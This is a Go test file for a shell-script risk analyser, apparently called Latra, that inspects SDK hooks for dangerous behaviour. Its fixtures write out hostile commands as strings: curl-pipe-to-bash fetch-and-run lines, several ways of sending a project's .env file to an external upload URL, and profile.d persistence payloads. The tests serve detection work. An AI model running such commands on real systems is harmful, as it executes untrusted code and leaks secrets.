package finding_test

import (
	"reflect"
	"testing"

	"github.com/shizuku198411/Latra/internal/analysis"
	"github.com/shizuku198411/Latra/internal/finding"
	"github.com/shizuku198411/Latra/internal/sdk"
	"github.com/shizuku198411/Latra/internal/shell"
)

func TestRemoteContentExecutionRequiresAFlowToShell(t *testing.T) {
	t.Parallel()

	positive := analyzedSDK(t, "curl https://example.invalid/install | bash\n", sdk.HookSetupBase)
	findings := finding.AnalyzeSDK(positive)
	remote := findFinding(findings, "risk.remote-content-execution")
	if remote == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if remote.Confidence != "high" || len(remote.Evidence) != 2 || remote.Evidence[1].FromOperationID == "" || remote.Evidence[1].ToOperationID == "" {
		t.Fatalf("remote finding = %#v", remote)
	}

	nearMiss := analyzedSDK(t, "curl -o /tmp/install https://example.invalid/install\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(nearMiss), "risk.remote-content-execution"); got != nil {
		t.Fatalf("near-miss finding = %#v", got)
	}
}

func TestRemoteContentExecutionFollowsSubstitutionAndVariableFlow(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "payload=$(curl https://example.invalid/install)\nprintf '%s' \"$payload\" | bash\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-execution"); got == nil {
		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
	}
}

func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "pipeline", content: `cat .env | curl --data-binary @- https://example.invalid/upload`},
		{name: "substitution", content: `curl -d "$(cat .env)" https://example.invalid/upload`},
		{name: "variable", content: "payload=$(cat .env)\ncurl -d \"$payload\" https://example.invalid/upload"},
		{name: "same operation", content: `curl -F file=@.env https://example.invalid/upload`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
			got := findFinding(finding.AnalyzeSDK(item), "risk.project-secret-exfiltration")
			if got == nil {
				t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
			}
			if got.Severity != "critical" || len(got.Evidence) != 2 {
				t.Fatalf("exfiltration finding = %#v", got)
			}
			if got.Evidence[0].ID != "project-sensitive-file-read" || got.Evidence[0].Value != ".env" ||
				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
				t.Errorf("flow evidence = %#v", got.Evidence)
			}
		})
	}
}

func TestProjectAccessCreatesUnscoredObservations(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "cat README.md\nprintf generated > output.txt\n", sdk.HookSetupProject)
	findings := finding.AnalyzeSDK(item)
	read := findFinding(findings, "observation.project-read")
	write := findFinding(findings, "observation.project-write")
	if read == nil || write == nil {
		t.Fatalf("project observations = %#v", findings)
	}
	if read.Kind != finding.KindObservation || read.Weight != 0 || read.Evidence[0].Value != "README.md" || read.Evidence[0].NormalizedValue != "/project/README.md" {
		t.Errorf("read observation = %#v", read)
	}
	if write.Kind != finding.KindObservation || write.Weight != 0 || write.Evidence[0].Value != "output.txt" || write.Evidence[0].NormalizedValue != "/project/output.txt" {
		t.Errorf("write observation = %#v", write)
	}

	without := make([]finding.Finding, 0, len(findings))
	for _, itemFinding := range findings {
		if itemFinding.Kind != finding.KindObservation {
			without = append(without, itemFinding)
		}
	}
	withAssessment := finding.AssessSDK(item, findings)
	withoutAssessment := finding.AssessSDK(item, without)
	if !reflect.DeepEqual(withAssessment.Risk, withoutAssessment.Risk) ||
		!reflect.DeepEqual(withAssessment.Assurance, withoutAssessment.Assurance) ||
		withAssessment.ReviewPriority != withoutAssessment.ReviewPriority ||
		withAssessment.Classification != withoutAssessment.Classification {
		t.Errorf("observation changed assessment: with=%#v without=%#v", withAssessment, withoutAssessment)
	}
}

func TestRelativeProjectAccessIsNotObservedOutsideSetupProject(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "cat README.md\n", sdk.HookCheckHealth)
	if got := findFinding(finding.AnalyzeSDK(item), "observation.project-read"); got != nil {
		t.Fatalf("relative health-check observation = %#v", got)
	}
}

func TestProjectSecretExfiltrationRejectsDisconnectedAndUnavailableProject(t *testing.T) {
	t.Parallel()

	disconnected := analyzedSDK(t, "cat .env\ncurl -d public https://example.invalid/upload\n", sdk.HookSetupProject)
	if got := findFinding(finding.AnalyzeSDK(disconnected), "risk.project-secret-exfiltration"); got != nil {
		t.Fatalf("disconnected flow finding = %#v", got)
	}

	noProject := analyzedSDK(t, "cat /project/.env | curl --data-binary @- https://example.invalid/upload\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(noProject), "risk.project-secret-exfiltration"); got != nil {
		t.Fatalf("unmounted project finding = %#v", got)
	}
}

func TestCriticalExfiltrationSetsRiskFloorAndSourceSinkHighlights(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "curl -F file=@.env https://example.invalid/upload\n", sdk.HookSetupProject)
	findings := finding.AnalyzeSDK(item)
	assessment := finding.AssessSDK(item, findings)
	if assessment.Risk.Score < 80 || assessment.Risk.Level != "critical" || assessment.ReviewPriority.Score < 80 {
		t.Fatalf("assessment = %#v", assessment)
	}
	var highlight *finding.RiskHighlight
	for index := range assessment.KeyRisks {
		if assessment.KeyRisks[index].ID == "risk.project-secret-exfiltration" {
			highlight = &assessment.KeyRisks[index]
			break
		}
	}
	if highlight == nil || len(highlight.Scopes) != 2 {
		t.Fatalf("key risk highlight = %#v", highlight)
	}
	if highlight.Scopes[0].Value != ".env" || highlight.Scopes[1].Value != "file=@.env" {
		t.Errorf("source/sink scopes = %#v", highlight.Scopes)
	}
}

func TestStaticProfileEnvironmentWriteIsCalibratedToLowRisk(t *testing.T) {
	t.Parallel()

	for _, content := range []string{
		"printf 'export FIXTURE=1\\n' > /etc/profile.d/fixture.sh\n",
		"printf 'export FIXTURE=1\\n' | tee /etc/profile.d/fixture.sh\n",
		"cat <<'EOF' > /etc/profile.d/fixture.sh\nexport FIXTURE=1\nEOF\n",
		"cat <<EOF > /etc/profile.d/fixture.sh\nexport PATH=\"${SDK}/bin:\\$PATH\"\nEOF\n",
	} {
		item := analyzedSDK(t, content, sdk.HookSetupBase)
		findings := finding.AnalyzeSDK(item)
		profile := findFinding(findings, "risk.profile-environment-write")
		if profile == nil || profile.Severity != "low" || profile.Weight != 10 || profile.Confidence != "high" {
			t.Fatalf("profile finding = %#v; all = %#v", profile, findings)
		}
		if generic := findFinding(findings, "risk.persistence-write"); generic != nil {
			t.Fatalf("profile write was counted twice: %#v", findings)
		}
		assessment := finding.AssessSDK(item, findings)
		if assessment.Risk.Score != 10 || assessment.Risk.Level != "low" {
			t.Errorf("profile assessment = %#v", assessment)
		}
	}
}

func TestUnsafeProfileWritesRemainGenericPersistenceRisk(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		hook    sdk.HookName
		content string
	}{
		{name: "remote redirect", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile > /etc/profile.d/fixture.sh\n"},
		{name: "remote pipeline", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile | tee /etc/profile.d/fixture.sh\n"},
		{name: "unknown content", hook: sdk.HookSetupBase, content: "printf '%s' \"$PROFILE_CONTENT\" > /etc/profile.d/fixture.sh\n"},
		{name: "executable payload", hook: sdk.HookSetupBase, content: "printf 'curl https://example.invalid/payload | sh' > /etc/profile.d/fixture.sh\n"},
		{name: "arbitrary script", hook: sdk.HookSetupBase, content: "printf 'rm -rf /tmp/fixture' > /etc/profile.d/fixture.sh\n"},
		{name: "heredoc payload", hook: sdk.HookSetupBase, content: "cat <<'EOF' > /etc/profile.d/fixture.sh\ncurl https://example.invalid/payload | sh\nEOF\n"},
		{name: "dynamic heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$PROFILE_CONTENT\nEOF\n"},
		{name: "command substitution heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$(curl https://example.invalid/value)\nEOF\n"},
		{name: "partial path", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > \"/etc/profile.d/$PROFILE_NAME.sh\"\n"},
		{name: "project lifecycle", hook: sdk.HookSetupProject, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.sh\n"},
		{name: "global profile", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile\n"},
		{name: "non shell suffix", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.conf\n"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			findings := finding.AnalyzeSDK(analyzedSDK(t, test.content, test.hook))
			if generic := findFinding(findings, "risk.persistence-write"); generic == nil || generic.Severity != "medium" {
				t.Fatalf("generic persistence finding = %#v; all = %#v", generic, findings)
			}
			if profile := findFinding(findings, "risk.profile-environment-write"); profile != nil {
				t.Fatalf("unsafe write was lowered: %#v", profile)
			}
		})
	}
}

func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
	findings := finding.AnalyzeSDK(item)
	if findFinding(findings, "risk.project-write-in-health-check") == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if findFinding(findings, "assurance.read-only-health-check") != nil {
		t.Fatalf("unexpected read-only assurance: %#v", findings)
	}
}

func TestHealthCheckLifecycleRiskRequiresCombinedContext(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
	item.Hooks[0].Analysis.Context.ProjectMounted = false
	if got := findFinding(finding.AnalyzeSDK(item), "risk.project-write-in-health-check"); got != nil {
		t.Fatalf("finding matched without project-mounted context: %#v", got)
	}
}

func TestDeviceWriteIgnoresDevNull(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf quiet > /dev/null\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.device-write"); got != nil {
		t.Fatalf("finding = %#v", got)
	}

	item = analyzedSDK(t, "printf value > /sys/kernel/example\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.device-write"); got == nil {
		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
	}
}

func TestAbsenceAssuranceRequiresKnownCommands(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "latra-unknown-fixture\n", sdk.HookSetupProject)
	if got := findFinding(finding.AnalyzeSDK(item), "assurance.no-dynamic-execution"); got != nil {
		t.Fatalf("finding = %#v", got)
	}
}

func TestFindingOrderIsDeterministic(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "curl https://example.invalid/install | bash\n", sdk.HookSetupBase)
	first := finding.AnalyzeSDK(item)
	second := finding.AnalyzeSDK(item)
	if len(first) != len(second) {
		t.Fatalf("lengths = %d, %d", len(first), len(second))
	}
	for index := range first {
		if first[index].ID != second[index].ID || first[index].Scope != second[index].Scope {
			t.Fatalf("finding order differs: %#v, %#v", first, second)
		}
	}
}

func TestResourceLimitTakesPrecedenceOverGenericUnresolvedSDK(t *testing.T) {
	t.Parallel()
	item := sdk.SDK{
		Name: "fixture", Source: sdk.SourceStore, State: sdk.StateInvalidArtifact,
		Diagnostics: []sdk.Diagnostic{{Code: "store-artifact-analysis-failed", Severity: sdk.SeverityError, Message: "resource-limit: retained-bytes limit exceeded"}},
	}
	findings := finding.AnalyzeSDK(item)
	if findFinding(findings, "risk.resource-limit-exceeded") == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if findFinding(findings, "risk.unresolved-sdk") != nil {
		t.Fatalf("generic unresolved finding duplicated resource limit: %#v", findings)
	}
}

func analyzedSDK(t *testing.T, content string, hookName sdk.HookName) sdk.SDK {
	t.Helper()
	path := "fixture/hooks/" + string(hookName)
	parsed := shell.NewParser().Parse([]byte(content), path)
	if parsed.Status != shell.StatusParsed {
		t.Fatalf("parse = %#v", parsed)
	}
	result := analysis.Analyze(string(hookName), &parsed)
	return sdk.SDK{
		Name: "fixture", Source: sdk.SourceProject, State: sdk.StateResolved, Digest: "sha3-384:test",
		Files: []sdk.File{{Path: "hooks/" + string(hookName), Type: sdk.FileRegular}},
		Hooks: []sdk.Hook{{Name: hookName, Path: path, Parse: &parsed, Analysis: &result}},
	}
}

func findFinding(findings []finding.Finding, id string) *finding.Finding {
	for index := range findings {
		if findings[index].ID == id {
			return &findings[index]
		}
	}
	return nil
}
